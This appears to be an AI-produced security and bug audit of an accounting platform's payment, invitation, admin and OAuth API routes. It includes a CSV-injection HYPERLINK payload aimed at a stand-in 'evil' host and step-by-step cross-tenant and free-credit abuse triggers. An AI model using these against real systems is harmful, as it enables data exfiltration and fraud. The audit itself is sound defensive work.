## Findings for pages/api (non-accounting, non-payroll): admin, auth, billing, cron, oauth, portal, webhooks, invitations, bureau, onboarding, developer, health, misc

Scope covered directly by me: cron, webhooks, oauth, portal, invitations/invite, auth.
Delegated to two subagents (findings merged and attributed): `pages/api/admin/**` (75 files) and `pages/api/billing/**` + bureau/onboarding/bank-feeds/developer/track/waitlist/contact/health.

---

### [CRITICAL] Paystack invoice payments never reach the general ledger
- File: pages/api/webhooks/paystack.ts:227-240; pages/api/portal/payments/paystack/verify.ts:80-96
- Bug: On `charge.success` for a customer invoice, both paths do a single `UPDATE customer_invoices SET amount_paid = ...`. Nothing inserts a `customer_payments` row and nothing posts a journal. There is no trigger on `customer_invoices` either (only `update_customer_invoices_updated_at`, migration 000_users_and_auth.sql:172). The AR subledger records the payment; the AR control account and the bank account in the GL never move.
- Trigger: a customer pays a R50 000 invoice through the portal. The invoice flips to `paid` and drops out of aging; the trial balance still carries R50 000 in AR and the bank GL never receives the deposit. When the Paystack settlement later lands on the bank statement it cannot be allocated, because the invoice already shows zero outstanding. Books are permanently out by the payment amount.
- Confidence: HIGH
- Evidence:
```sql
UPDATE customer_invoices
SET amount_paid = LEAST(total_amount, COALESCE(amount_paid, 0) + ${amountRand}),
    status = CASE WHEN COALESCE(amount_paid,0) + ${amountRand} >= total_amount THEN 'paid' ELSE status END
WHERE id = ${pr.customer_invoice_id} AND company_id = ${pr.company_id}
```
(that is the entire effect of a successful payment)

### [CRITICAL] Bureau owner can link ANY company on the platform and read its books
- File: pages/api/bureau/clients.ts:59-72; src/modules/bureau/services/bureauService.ts:149-159
- Bug: `POST /api/bureau/clients` authorises only that the caller owns the bureau (`isBureauOwner`). It never checks the caller has any relationship to `companyId` — no `company_users` membership check, no invitation/acceptance step. `linkCompanyToBureau` inserts the row unconditionally. Once linked, `getBureauClientForUser` treats the company as entitled, so `GET /api/bureau/client/<uuid>` and `GET /api/bureau` return that tenant's cash balance, AR, AP, MTD revenue/profit and work items.
- Trigger: a provisioned bureau owner obtains another tenant's `company_id` (a UUID, but they appear in URLs, exports and support threads) → `POST /api/bureau/clients {bureauId: <their own>, companyId: <victim>}` → 200 `{linked:true}` → `GET /api/bureau/client/<victim>` returns the victim's financials. No notification; the link persists.
- Confidence: HIGH
- Evidence:
```ts
if (!(await isBureauOwner(userId, parsed.data.bureauId))) { return apiResponse.forbidden(...); }
await linkCompanyToBureau({ bureauId, companyId: parsed.data.companyId, addedBy: userId });
```
- Mitigating: bureau creation is admin-only (`convertUserToBureauOwner` reachable only from pages/api/admin/users/[id]/convert-to-bureau.ts), so the attacker must already be a provisioned bureau owner — an external accounting firm. That is still an untrusted-of-other-tenants user class, so this remains cross-tenant.

### [CRITICAL] SARS-code admin writes are silently rolled back (non-UUID into a UUID audit column)
- File: pages/api/admin/payroll/sars-codes/release.ts:40, import.ts:143, [code].ts:58
- Bug: `admin_audit_log.target_id` is `UUID` (migration 264_admin_platform_audit.sql:10, never altered). These three routes pass `String(taxYear)` (`'2026'`) and `` `${code}@${taxYear}` `` (`'3601@2026'`). The INSERT raises 22P02. `logAdminAction` catches it, and because `sars_codes.*` is not in `CRITICAL_ACTIONS` it swallows and returns. But the failed statement aborted the shared `withPlatformAdmin` transaction (all `sql` calls route through the ALS client). The handler returns `apiResponse.success(...)` and `withPlatformAdmin` runs COMMIT on an aborted tx — Postgres answers ROLLBACK without error.
- Trigger: `POST /api/admin/payroll/sars-codes/release {taxYear:2026}` → HTTP 200 `{taxYear:2026,isCurrent:true}`; `sars_code_releases.is_current` unchanged. Same for a 5 MB code import (200 with `upserted: N`, zero rows persisted).
- Confidence: HIGH
- Evidence: `target_id UUID,` vs `'sars_code_release', String(parsed.data.taxYear),` and `'sars_source_code', \`${code}@${taxYear}\`,`

---

### [HIGH] Accepting an invitation overwrites an existing user's password
- File: pages/api/invitations/[token]/accept.ts:54-57; pages/api/invitations/index.ts:55-59
- Bug: `adminCreateUser` returns the *existing* GoTrue user on 422 (src/lib/auth/gotrue.ts:196-200). The accept handler then calls `adminUpdateUser(inv.gotrue_user_id, { password })` unconditionally. There is no check for whether that identity already belongs to a real account with other memberships.
- Trigger: anyone who self-registers a company (self-serve signup is live) invites `victim@bigco.com`. The victim, already an IsaFlow user elsewhere, opens the invite and sets a password — their existing account password is replaced. Their old password stops working across every company they belong to. The accept flow should detect an existing account and require login instead of setting a password.
- Confidence: HIGH
- Evidence: `await adminUpdateUser(inv.gotrue_user_id, { password, user_metadata: { first_name: firstName, last_name: lastName } });`

### [HIGH] Flow bundles credited free when PAYSTACK_SECRET_KEY is unset — fail-open
- File: pages/api/billing/flows/purchase.ts:37-68
- Bug: `paystackConfigured()` is a plain env-var truthiness test. When false the handler skips the gateway entirely and calls `startBundlePurchase` + `completeBundlePurchase`, crediting the wallet immediately with `payment_method:'admin_recorded'`. No `NODE_ENV` guard, no rate limit, no admin role gate — any PAYG tenant user with CSRF can call it.
- Trigger: prod restarts with `PAYSTACK_SECRET_KEY` missing/blank (rotation, bad .env deploy, secret dropped from the systemd unit). Any PAYG user POSTs `{bundleId: <Large>}` in a loop → 2 500 Flows credited per call, unlimited, all recorded as legitimate `succeeded` purchases in `flow_ledger`. `/api/health/deep` reports `degraded`, not `down`, so nothing blocks traffic.
- Confidence: HIGH
- Evidence:
```ts
function paystackConfigured(): boolean { return Boolean(process.env.PAYSTACK_SECRET_KEY); }
if (!paystackConfigured()) {
  const pending = await startBundlePurchase(...);
  const completed = await completeBundlePurchase(pending.purchaseId);   // credits the wallet, no payment
```

### [HIGH] One authorisation flips EVERY pending mandate active; revoke then leaves one behind
- File: pages/api/billing/paystack/mandate/verify.ts:73-89; same defect at pages/api/webhooks/paystack.ts:255-269
- Bug: the promote-to-active UPDATE is scoped by `company_id AND status='pending'` (webhook: `status IN ('pending','active')`), not by the mandate id the verified reference belongs to. `mandate/create.ts` only blocks stacking when an *active* mandate exists, so several `pending` rows can accumulate. One successful R1 authorisation flips all of them to `active` with the same `authorization_code`. `revoke.ts` then revokes only `LIMIT 1`.
- Trigger: user clicks "Set up recurring debit" twice (two pending rows), completes checkout once → verify activates both. Later they revoke the debit order → one row is revoked; `generateDueCharges`/`runQueuedCharges` still find the second active mandate with a valid authorization code and keep debiting the card. Customer is charged after cancelling.
- Confidence: HIGH
- Evidence:
```sql
UPDATE subscription_mandates SET status = 'active', paystack_authorization_code = ${...}
 WHERE company_id = ${req.companyId} AND status = 'pending' AND gateway = 'paystack'
-- revoke.ts
SELECT id ... WHERE company_id = ${req.companyId} AND status = 'active' LIMIT 1
```

### [HIGH] Re-inviting the same email returns a 500
- File: pages/api/invitations/index.ts:47-51
- Bug: `company_invitations` has `UNIQUE(company_id, email)` (migration 258_company_invitations.sql:16). The INSERT has no `ON CONFLICT`. Any second invitation to an address already holding a row raises 23505.
- Trigger: an owner invites `staff@acme.co.za`, the person never accepts, the owner re-sends. Hard 500 with no usable error; the only workaround is revoking the stale invite first. A previously-accepted-then-removed user can never be re-invited through this path at all (the accepted row is never deleted).
- Confidence: HIGH
- Evidence: `INSERT INTO company_invitations (company_id, email, role, invited_by, token, expires_at) VALUES (...) RETURNING id` — no ON CONFLICT clause, unlike userInvitationService.ts:86 which has one.

### [HIGH] Portal token / payment-link routes use the user's DEFAULT company, not the active one
- File: pages/api/portal/invoice/generate.ts:32-42; pages/api/portal/invoice/[token].ts:173-183; pages/api/portal/payment-link.ts:59-68
- Bug: all three run under `withAuth`, which already resolves `req.companyId` from the active-company cookie, then discard it and re-query `company_users ... ORDER BY is_default DESC, created_at ASC LIMIT 1`. The invoice lookup is then scoped to that default company.
- Trigger: a bookkeeper belonging to companies A (default) and B switches to B (`/api/auth/switch-company`) and clicks "share invoice link" on a B invoice. `companyId` resolves to A, the invoice is not found there, and the user gets 404 "Invoice" for an invoice that plainly exists. Feature is broken for every multi-company user.
- Confidence: HIGH
- Evidence: `SELECT company_id FROM company_users WHERE user_id = ${userId} ORDER BY is_default DESC, created_at ASC LIMIT 1`

### [HIGH] A swallowed audit-log failure poisons the tx and turns any admin write into a 200-with-no-effect
- File: src/modules/admin/services/auditService.ts:78-88
- Bug: the general form of the SARS finding. `logAdminAction` runs its INSERT on the ALS-bound connection with no savepoint. For any action not in `CRITICAL_ACTIONS` the catch logs and returns — but the connection is now in 25P02. The route replies 200 and `withPlatformAdmin` COMMITs (= rollback). The route can never detect it. This covers money: `flow.adjust` is not in `CRITICAL_ACTIONS`.
- Trigger: any transient failure of the `admin_audit_log` INSERT during `POST /api/admin/billing/payg/<id>/adjust` → response `{success:true, data:{balanceAfter: 5000}, message:'Wallet adjusted'}` while `flow_wallet.balance_flows` and `flow_ledger` are unchanged. The admin re-adjusts, believing the first credit failed to display.
- Confidence: HIGH (mechanism verified; trigger guaranteed for the SARS routes, opportunistic elsewhere)
- Evidence: `} catch (err) { log.error('logAdminAction failed', …); if (CRITICAL_ACTIONS.has(action)) { … throw … } }` — no savepoint, no rethrow otherwise.

### [HIGH] CRITICAL_ACTIONS names don't match the action strings the routes emit
- File: src/modules/admin/services/auditService.ts:39-50
- Bug: the set lists `'feature.override'`, `'feature.remove_override'`, `'user.impersonate'` — none of which is emitted anywhere. The feature-override routes log `'company_feature.override_set'` / `'company_feature.override_removed'`. The fail-closed guarantee ("privileged mutation must not persist without its audit row") therefore does not apply to feature overrides at all. Also absent: `'flow.adjust'` (wallet money), `'user.delete'`, `'company.create'`, `'waitlist.promote'`, `'trial.convert_to_paid'`, `'user.add_to_company'`.
- Trigger: `POST /api/admin/companies/<id>/features` with a failing audit write → override applied (or silently rolled back per the finding above) with no audit trail and no error; the `criticalAuditFailed` flag is never set.
- Confidence: HIGH

### [HIGH] withPlatformAdmin COMMITs on every 4xx — validate-after-write commits partial admin edits
- File: src/lib/auth/withPlatformAdmin.ts:150 (`await adminClient.query('COMMIT')`); pages/api/admin/companies/[id].ts:78-92; pages/api/admin/users/[id].ts:60-76
- Bug: unlike `withAuth` (which rolls back on status >= 500), `withPlatformAdmin` COMMITs unconditionally unless the handler throws. Both detail routes write first, then re-read and return 404/400 from a catch. The write is committed anyway.
- Trigger: `PATCH /api/admin/users/<id>` where `updateUser` succeeds but the follow-up `getUserDetail(userId)` returns null → response 404 "User", the role/name change committed, and no audit row written (the `logAdminAction` call sits below the early return).
- Confidence: HIGH
- Evidence: `await updateUser(userId, {…}); const updated = await getUserDetail(userId); if (!updated) { return apiResponse.notFound(res, 'User', userId); }`

### [HIGH] Admin bulk actions loop inside one shared tx with no savepoint — one bad id discards the batch while reporting success
- File: pages/api/admin/companies/bulk-action.ts:61-105; pages/api/admin/job-queue/bulk-action.ts:50-95
- Bug: each iteration issues bare `sql` on the shared tx inside try/catch. The first SQL-level failure aborts the transaction; every later iteration then fails with 25P02 and is appended to `errors[]`, and the already-successful earlier items are lost at the final COMMIT-as-rollback. The route returns `apiResponse.success(res, { processed, errors })` with a non-zero `processed`.
- Trigger: `POST /api/admin/companies/bulk-action {action:'extend_trial', company_ids:[…]}` where the audit INSERT fails on item 1 → 200 with a partial-success report; none of the trial extensions persist, and the admin re-runs only the listed failures.
- Confidence: HIGH (mechanism), MEDIUM (needs one item to fail)
- Evidence: `catch (err) { … errors.push(...) }` around a bare `await sql\`UPDATE companies …\``; contrast `sql.transaction`/`withTransaction`, which do wrap in SAVEPOINT.

---

### [MEDIUM] Invoice payment can be double-credited inside a one-second window
- File: pages/api/portal/payments/paystack/verify.ts:91-94
- Bug: the guard against the webhook having already credited is `NOT EXISTS (SELECT 1 FROM paystack_payment_requests p2 WHERE p2.id = ${pr.id} AND p2.completed_at < now() - INTERVAL '1 second')`. That is a timing heuristic, not a state check. `verify` reads `status` before its network call to Paystack, so the webhook can complete and credit during that call; `completed_at` (preserved via COALESCE) is then younger than one second and the guard passes. `verify`'s own UPDATE of `paystack_payment_requests` also has no `status='pending'` guard, so it cannot detect the webhook having won.
- Trigger: a partial payment on an invoice where webhook and return-page verify land within a second of each other. `amount_paid` is credited twice; `LEAST(total_amount, ...)` caps it at the full total, so a half-paid invoice is marked `paid`.
- Confidence: MEDIUM

### [MEDIUM] Two invitation systems write incompatible token encodings into one column
- File: pages/api/invitations/index.ts:43-51 stores the RAW token; src/modules/accounting/services/core/userInvitationService.ts:80-93 stores `sha256(token)` into the same `company_invitations.token`
- Bug: `/api/invitations/[token]/*` compares raw; `/api/invite/[token]` compares the hash (`WHERE ci.token = ${hashToken(token)}`). Each pair is internally consistent, but they share one row per `(company_id, email)` and the service path has `ON CONFLICT (company_id, email) DO UPDATE SET token = EXCLUDED.token`. The two flows also email different landing pages (`/accept-invite?token=` vs `/invite/<token>`).
- Trigger: an owner invites someone through the settings screen (raw token, `/accept-invite` link emailed), then re-invites through the accounting users screen. The second write replaces the token with a hash and the first emailed link is dead with a 410. `pages/login.tsx:262` also fetches `/api/invite/${inviteToken}` while `pages/register.tsx:28` redirects to `/accept-invite?token=`, so a token minted by one path can be handed to the other path's validator.
- Confidence: HIGH

### [MEDIUM] Invitation lookup leaks the full invitee email and ignores expiry/acceptance
- File: pages/api/invitations/[token]/index.ts:11-22
- Bug: the query has no `accepted_at IS NULL` or `expires_at > now()` filter despite the 410 message claiming "not found, expired, or already accepted", and it returns `ci.email` unmasked. The sibling route `/api/invite/[token]` masks the address (`maskEmail`) and does filter.
- Trigger: anyone holding an expired or already-used invite link reads the invited person's full email address, role and company name indefinitely.
- Confidence: HIGH

### [MEDIUM] One OAuth authorisation row per (app, user, company) kicks the previous device off
- File: src/lib/auth/oauth.ts:359-369
- Bug: `issueTokens` upserts `ON CONFLICT (oauth_app_id, user_id, company_id) DO UPDATE SET access_token_hash = EXCLUDED...`. There is one row per triple, so a second consent overwrites the first token rather than adding a session.
- Trigger: a user connects the same MCP client from Claude Desktop and then from claude.ai for the same company. The desktop token stops validating at the next call with no error the user can interpret.
- Confidence: HIGH

### [MEDIUM] mandate/verify has no role gate while create/revoke require admin
- File: pages/api/billing/paystack/mandate/verify.ts:135
- Bug: `create.ts` and `revoke.ts` are `withAuth(withRole('admin')(...))`; `verify.ts` is plain `withAuth`. It performs writes — promoting a mandate to `active` or marking it `failed` — so any non-admin member of the company can force the mandate state machine. Combined with the mandate finding above, a viewer-role user can flip the company's pending mandates to active.
- Trigger: a non-admin with the return-page URL (browser history, a shared link) calls `GET /api/billing/paystack/mandate/verify?ref=<ref>`.
- Confidence: HIGH
- Evidence: `export default withAuth(withErrorHandler(handler));`

### [MEDIUM] generateDueCharges can permanently strand a subscription unbilled
- File: src/modules/billing/services/subscriptionBillingService.ts:111-131
- Bug: the `INSERT INTO subscription_charges` and the `UPDATE subscriptions SET current_period_start/end` are two separate statements with no transaction. If the process dies or the UPDATE errors between them, the charge row exists but the period never advances. On the next cron run the same period is recomputed, the dedupe query finds the existing charge, and the loop does `skipped++; continue` — forever.
- Trigger: the cron container is killed (deploy, OOM) after the INSERT and before the UPDATE → that tenant is never billed again, silently, with `skipped` incrementing each run.
- Confidence: HIGH

### [MEDIUM] Retried subscription charges reuse the same Paystack reference and can never succeed
- File: src/modules/billing/services/subscriptionBillingService.ts:201-215
- Bug: `runQueuedCharges` retries a `failed` charge after 24h using `const reference = c.paystack_reference ?? c.external_reference` — the identical reference the first transaction used. Paystack rejects a `charge_authorization` reusing an existing reference, so the retry throws and lands in the catch as another failure. After `MAX_ATTEMPTS = 3` the charge is excluded forever by the `attempt_count < 3` filter.
- Trigger: first debit fails for insufficient funds → two retries fail with duplicate-reference errors rather than bank declines → revenue never collected and `failure_reason` blames Paystack.
- Confidence: MEDIUM (depends on Paystack's exact duplicate-reference semantics; the reference reuse itself is certain — contrast `generateDueCharges`, which appends `randomBytes(4)`)

### [MEDIUM] A non-active mandate burns all three charge attempts
- File: src/modules/billing/services/subscriptionBillingService.ts:184-199
- Bug: when the mandate is not active or has no authorization code, the charge is marked `failed` AND `attempt_count = attempt_count + 1`. Nothing was submitted to Paystack, yet it consumes one of three lifetime attempts.
- Trigger: a card expires, the mandate is non-active for 3 cron ticks, the customer re-authorises → the queued charge is already at `attempt_count = 3` and is never picked up again. That period is never billed.
- Confidence: HIGH
- Evidence: `SET status = 'failed', failure_reason = 'mandate_not_active_or_missing_authorization', attempt_count = attempt_count + 1, ...`

### [MEDIUM] triggerAutoTopup credits a bundle with no payment taken (latent)
- File: src/modules/billing/services/flowWalletService.ts:536-564
- Bug: the only gate between "insufficient flows" and a free bundle credit is `wallet.payment_method_token` being non-null. The comment says `// v2 hook: charge via Stitch here` — no charge is ever made, yet `purchaseBundle` unconditionally credits the wallet and writes a `purchase` ledger row. Nothing currently writes `payment_method_token` (verified: no writer outside migration 437), so it is dormant, but no assertion enforces that. The moment a Paystack authorization code is stored there — the natural v2 implementation, and verify.ts/the webhook already capture exactly such a token — every `InsufficientFlowsError` becomes a free bundle.
- Confidence: HIGH on the code path; MEDIUM severity today because activation is latent.

### [MEDIUM] Invitation 502 path tells the user to resend an invitation that was rolled back
- File: pages/api/invitations/index.ts:83-88
- Bug: on email failure the handler writes `email_error` and returns 502. `withAuth` rolls back on status >= 500, so the invitation row, the `gotrue_user_id` stash and the error message all vanish. The GoTrue user, created outside the transaction, survives.
- Trigger: SMTP is down. The admin sees "Invitation created but email delivery failed. You can resend." and finds nothing in the pending list to resend.
- Confidence: MEDIUM

### [MEDIUM] Web-analytics CSV export skips the CSV-injection neutraliser every other export uses
- File: pages/api/admin/analytics/web/export.ts:16-21
- Bug: `csvCell()` only quotes; it does not call `neutralizeCsvCell` (used by companies/export.ts, users/export.ts, billing/subscriptions/export.ts). The exported columns `url_path`, `url_query`, `page_title`, `referrer_domain`, `referrer_path`, `utm_*` are supplied by whoever visits the tracked public website.
- Trigger: a visitor loads `https://site/?utm_source=%3DHYPERLINK("http://evil/"%26A1,"click")`; a super-admin exports and opens the CSV in Excel → the formula executes with the exported row data.
- Confidence: HIGH
- Evidence: `if (/[",\n\r]/.test(s)) return \`"${s.replace(/"/g, '""')}"\`; return s;` — no `=`/`+`/`-`/`@` prefix guard.

### [MEDIUM] PAYG admin list sorts the wrong companies to the top
- File: pages/api/admin/billing/payg/companies.ts:70
- Bug: `ORDER BY w.nudge_level DESC NULLS LAST, c.name`. `nudge_level` is TEXT with CHECK `('none','yellow','orange','red')` (migration 437:85), not an ordered enum. `DESC` is alphabetical: yellow, red, orange, none. The screen's purpose is "most-at-risk first", so `red` companies appear below every `yellow` one.
- Confidence: HIGH

### [MEDIUM] Admin MRR figures disagree across screens
- File: src/modules/admin/services/revenueService.ts:57-64; adminCompanyService.ts:76-83; pages/api/admin/companies/export.ts:70-77 — vs billingService.ts:35-38
- Bug: `getBillingOverview` computes MRR as `price × (100 − discount_percent)/100` and only for `status='active'`. The plan breakdown, company list and CSV export use the raw plan price and include `status IN ('active','trial')`. The same tenant reports two different MRRs, and the plan breakdown's `pct_of_total` is computed off the inflated base.
- Trigger: one company on a R1 000/mo plan with `discount_percent = 50` plus one trial company → overview MRR 50 000c; breakdown/CSV MRR 200 000c.
- Confidence: HIGH

### [MEDIUM] Company list/export duplicate companies holding more than one active/trial subscription
- File: src/modules/admin/services/adminCompanyService.ts:65-95; pages/api/admin/companies/export.ts:79-84
- Bug: `LEFT JOIN subscriptions s ON s.company_id = c.id AND s.status IN ('active','trial')` fans out, but the row query has no DISTINCT while the count query uses `COUNT(DISTINCT c.id)`. The list shows the company twice, the total doesn't match the rows, and paging shifts.
- Confidence: HIGH

### [MEDIUM] Impersonation cookies are set before the transaction carrying the audit row commits
- File: pages/api/admin/users/[id]/impersonate.ts:73-76, 100-119
- Bug: the comment asserts "withAdmin opens NO transaction, so ordering is the guarantee" — false: `withPlatformAdmin` wraps the handler in BEGIN…COMMIT on the ALS client and `sql` routes the `impersonation_start` INSERT onto it. The response (with Set-Cookie for the target's session) is flushed before that COMMIT.
- Trigger: connection drop / statement timeout at COMMIT → the admin holds the impersonated user's cookies with no audit row and no stash row; `end-impersonation` then returns STASH_EXPIRED.
- Confidence: MEDIUM (ordering verified; requires COMMIT to fail)

### [MEDIUM] recalculateNudge fires after the response on a connection about to be committed and released
- File: src/lib/billing/withFlowMeter.ts:112-119
- Bug: `void recalculateNudge(companyId).catch(...)` is not awaited but issues `sql` through the request's ALS connection. `withAuth` COMMITs and returns that connection to the pool as soon as the handler chain returns — immediately, since the call is not awaited.
- Trigger: any successful metered PAYG request → the nudge UPDATE either no-ops (logged as an unread warn) or executes on a connection already handed to another request. Company-scoped SQL, so no cross-tenant write, but `nudge_level` drifts out of sync with `month_flows_used` and the "running low" banner stops firing.
- Confidence: MEDIUM

---

### [LOW] Paystack authorisation capture updates every mandate for the company
- File: pages/api/webhooks/paystack.ts:255-269
- Bug: `WHERE company_id = ${pr.company_id} AND status IN ('pending','active')`, no mandate id, no LIMIT. Same root cause as the mandate/verify finding.
- Confidence: HIGH

### [LOW] Portal token mint and payment-link creation lack CSRF
- File: pages/api/portal/invoice/generate.ts:74; pages/api/portal/payment-link.ts:80
- Bug: both are state-changing POSTs under `withAuth` without `withCsrf`, unlike the neighbouring mutating routes. Minting a portal token creates a permanent unauthenticated read URL for an invoice.
- Confidence: HIGH

### [LOW] Refresh tokens minted regardless of offline_access
- File: src/lib/auth/oauth.ts:405-422
- Bug: `issueTokens` only mints a refresh token when `offline_access` was granted, but `refreshAccessToken` always writes a new one. A client reaching the refresh path keeps a 30-day rolling refresh token the user never consented to.
- Confidence: HIGH

### [LOW] Successful Flow refunds are logged as failures after the response is sent
- File: src/lib/billing/withFlowMeter.ts:97-108
- Bug: `res.setHeader('X-Flow-Refunded','true')` is inside the same try as `refundFlows` and runs after a 4xx has flushed. `setHeader` throws ERR_HTTP_HEADERS_SENT, which the adjacent catch swallows as 'flow refund failed after handler error' — even though the refund committed.
- Trigger: any metered PAYG endpoint returning 400/404 → an operator chases a phantom money bug in Bugsink for a refund that succeeded.
- Confidence: HIGH

### [LOW] Streamed CSV exports page with OFFSET over a non-unique sort key
- File: pages/api/admin/companies/export.ts:85-86; users/export.ts:87-88; billing/subscriptions/export.ts:78-79
- Bug: `ORDER BY c.created_at DESC LIMIT 500 OFFSET n` with no unique tiebreaker. Rows sharing a `created_at` can be emitted twice or skipped between chunks.
- Confidence: MEDIUM

### [LOW] Admin webhook mutation routes skip withCsrf
- File: pages/api/admin/webhooks/[id].ts:105; webhooks/[id]/redeliver.ts:64
- Bug: PATCH/DELETE and POST redeliver are wrapped with `withAdmin` only; every other mutating admin route adds `withCsrf`. The remaining defence is withAdmin's `X-Admin-Request: true` header check — a real mitigation, but an inconsistent, weaker gate for a route that can repoint a tenant's webhook URL.
- Confidence: HIGH (the difference is verified; exploitability limited by the header check)

### [LOW] Unvalidated companyId in PAYG admin routes returns 500 instead of 400
- File: pages/api/admin/billing/payg/[companyId]/adjust.ts:28-31, eligibility.ts:26-29
- Bug: `companyId` is only checked for non-empty string, then used against UUID columns. A malformed id raises 22P02, rolls back, and surfaces as a 500. Other admin routes validate with the UUID zod schema.
- Confidence: HIGH

### [LOW] onboarding/documents stores client-supplied file_size
- File: pages/api/onboarding/documents.ts:57,84
- Bug: the size limit is correctly enforced against `buf.length`, but the column written is `${doc.size}` — an unvalidated number from the request body. Consumers reading `company_documents.file_size` see a value the uploader chose.
- Trigger: `POST {documents:[{... size: 0}]}` with a 19 MB PDF → row stores `file_size = 0`.
- Confidence: HIGH

---

## Clean on review — verified, nothing found

- **Cron auth (all 13 routes)**: every route uses `timingSafeEqualStr(String(req.headers['x-cron-secret']), process.env.CRON_SECRET)` and fails closed with a 500 when `CRON_SECRET` is unset. `src/lib/timingSafe.ts` guards buffer length before `timingSafeEqual`. No missing gate, no `!==` comparison anywhere.
- **Webhook signatures**: Paystack verifies HMAC-SHA512 of the raw body with a length check before `timingSafeEqual`, and dedupes on `paystack_webhook_events.body_sha256` UNIQUE. Signum verifies HMAC and has a `signed_off` replay guard. Both dunning webhooks fail closed when `DUNNING_WEBHOOK_SECRET` is unset and compare timing-safe.
- **OAuth**: the auth-code exchange is PKCE-bound, single-use, redirect-URI-bound and app-bound inside one atomic UPDATE (a wrong verifier returns 0 rows without consuming the code). Refresh rotation is atomic with replay detection that revokes the whole authorisation. Consent enforces S256, a registered redirect URI, a scope allowlist, a server-authoritative opt-in gate for write scopes, and a membership re-check when `body.companyId` differs from `req.companyId`. DCR is kill-switched, rate-limited per-IP and globally, https/loopback-only, and always issues public clients.
- **Password reset**: tokens are 256-bit, stored only as sha256, single-use via an atomic `consumed_at` flip, prior tokens invalidated in the same transaction, 1-hour TTL, delivered in the URL fragment. `forgot-password` runs the mint+send detached so response timing does not leak account existence.
- **Login / 2FA / lockout**: account-standing gate sits after `signIn` and before the MFA branch; `listFactors` failure fails closed with a 503; the pending MFA token is HttpOnly-cookie-only with the body fallback removed; per-factor rate limiting on both challenge and disable; lockout recorded on 401/422 only.
- **switch-company**: re-checks membership under RLS with explicit JWT claims, and treats a malformed UUID cast error as "not a member".
- **end-impersonation**: requires CSRF plus being either the stash target or the stashing admin; the stash UUID alone is insufficient.
- **Admin auth gates**: all 75 `pages/api/admin/**` routes export `withAdmin` → `withPlatformAdmin` → GoTrue verify → `SELECT role WHERE id = auth.uid()` under RLS → 403 unless `role='super_admin'` → active-account check → only then the BYPASSRLS pool. No admin route is gated on `withAuth` alone. `impersonate-exchange.ts` uses `withAuth` but re-checks platform `super_admin` and membership.
- **Flow wallet money correctness**: migration 437 declares `balance_flows`, `month_flows_used`, `flow_ledger.flows`, `balance_after`, `flow_purchases.flows` as INT, so pg returns numbers and the arithmetic is real addition; `subscription_charges.amount_cents` is BIGINT and every use goes through `Number(...)`. `completeBundlePurchase` reads `FOR UPDATE` and returns early on `status='succeeded'` in the same transaction, so webhook + portal poll + cron cannot stack credits. `deductFlows`/`refundFlows`/`adminAdjust` all `lockWallet` before comparing and writing. `withTransaction` reuses the ALS connection and wraps nested calls in a savepoint. Auto-topup retries the debit exactly once.
- **bank-feeds/callback.ts**: state/CSRF sound (HttpOnly cookie set by connect.ts, compared to the query state, cleared after use); runs under `withAuth` so `companyId` comes from the session; the `bankAccountId` query param is not an IDOR because `createConnection` inserts via `SELECT ... FROM bank_accounts WHERE id = ... AND company_id = ...` and throws on no match.
- **audit-portal/download.ts**: bcrypt token verified against `audit_portal_sessions` before the export is fetched, and `getExport` is company-scoped.
- **Portal session routes** (`invoices.ts`, `statement.ts`, `chat.ts`): all verify the signed `portal_session` JWT and reject `clientId` mismatch against the session, and every query is scoped by `session.companyId`.
- Also clean: pages/api/billing/flows/{wallet,bundles,ledger,purchase-status,auto-topup}.ts, billing/plans.ts, paystack/mandate/status.ts, bureau/index.ts, bureau/client/[companyId].ts, features/check.ts, home.ts, onboarding/{complete,extract,extract-id,validate-directors}.ts, developer/oauth-apps/{index,[id]}.ts, track/event.ts, waitlist.ts, contact.ts, health/{index,deep}.ts, oauth/{metadata,resource-metadata,connected-apps,authorisations/[id]}.ts, auth/{me,profile,preferences,landing,logout,refresh,personal-tokens/*,2fa-status,2fa-enroll,2fa-confirm}.ts.

---

## Files read

pages/api/webhooks/{paystack,signum,dunning-response,dunning-inbound-email}.ts; all 13 files under pages/api/cron/**; all 12 files under pages/api/portal/**; pages/api/oauth/{token,consent,register}.ts; pages/api/invitations/{index.ts,[token]/accept.ts,[token]/index.ts,revoke/[id].ts}; pages/api/invite/[token].ts; pages/api/auth/{login,forgot-password,do-reset-password,verify-email,switch-company,2fa-challenge,2fa-disable,2fa-status,change-password,change-email,end-impersonation}.ts; pages/api/audit-portal/download.ts; src/lib/timingSafe.ts; src/lib/auth/{oauth,passwordResetService,gotrue}.ts; src/modules/accounting/services/ar/portalTokenService.ts; src/modules/accounting/services/core/userInvitationService.ts; scripts/migrations/sql/{000_users_and_auth,211_schema_patches,258_company_invitations}.sql; plus the `export default` gate of every remaining route in scope (enumerated across all ~105 non-accounting, non-payroll, non-admin routes).

Admin subagent additionally read: the full listing of all 75 admin routes, and in full companies/{[id],[id]/{activate,export-data,features,impersonate,suspend,users},bulk-action,export}, users/{[id],[id]/{impersonate,add-to-company,remove-from-company,convert-to-bureau},export}, billing/{overview,payg/companies,payg/[companyId]/{adjust,eligibility},invoices/[id]/mark-paid,subscriptions/[id]/cancel,subscriptions/export,flow-bundles/[id]}, analytics/{revenue,web/export}, job-queue/bulk-action, trials/convert, waitlist/[id]/promote, email-log/resend, payroll/sars-codes/{index,[code],import,release}, migration/sage-*, webhooks/[id], webhooks/[id]/redeliver; announcements/active.ts; auth/{impersonate-exchange,end-impersonation}.ts; src/lib/auth/{index,withPlatformAdmin}.ts; src/modules/admin/middleware/withAdmin.ts; src/lib/{neon,als}.ts; src/modules/admin/services/{auditService,adminCompanyService,billingService,revenueService}.ts; scripts/migrations/sql/{264,265,437}*.sql.

Billing subagent additionally read: pages/api/billing/** (all 11), src/modules/billing/services/{flowWalletService,paystackClient,subscriptionBillingService}.ts, src/lib/billing/withFlowMeter.ts, src/lib/mcp/flowMetering.ts, src/lib/neon.ts, scripts/migrations/sql/{437_payg_flow_wallet,486_paystack_billing}.sql, pages/api/bureau/**, src/modules/bureau/services/{bureauService,bureauClientMetricsService}.ts, pages/api/onboarding/**, pages/api/bank-feeds/**, src/modules/accounting/services/bank/{bankFeedService,bankFeedConnectionService}.ts, pages/api/developer/oauth-apps/**, pages/api/{track/event,waitlist,contact,home,landing-stats}.ts, pages/api/health/**.
